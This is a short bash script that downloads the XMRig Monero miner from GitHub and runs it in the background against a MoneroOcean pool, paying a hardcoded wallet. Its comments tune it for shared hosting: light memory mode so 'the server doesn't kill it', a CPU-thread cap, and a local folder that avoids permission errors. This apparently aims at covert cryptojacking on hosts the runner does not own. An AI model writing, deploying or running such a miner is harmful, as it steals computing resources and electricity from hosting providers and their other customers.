#!/bin/bash
WALLET=458dxk6pcKg3KR6YGVByY1FKKr88GPnz3XxQL7c7zx5UNoxAsKzMN4JJ8zbffq4LRv8dk5CXYBVAEdYBe2avS9qt7jjjKpa

# We use a LOCAL folder name, not $HOME, to avoid "Permission Denied"
DIR="mo_miner"

# 1. Kill old ones and clean up locally
killall -9 xmrig 2>/dev/null
rm -rf "$DIR"
mkdir -p "$DIR"
cd "$DIR"

# 2. Download official static XMRig (perfect for shared hosts)
curl -L "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz" | tar xz --strip-components=1

# 3. Launch with fixes for Shared Hosting:
# --no-cpu-topology: Fixes the "hwloc/linux" error you saw
# --randomx-mode=light: Keeps RAM at 256MB so the server doesn't kill it
# -B: Background mode
./xmrig -o gulf.moneroocean.stream:10128 -u $WALLET -p direct-bash --cpu-max-threads-hint=50 --randomx-mode=light --no-cpu-topology -B

echo "SUCCESS: Miner launched locally in ./$DIR"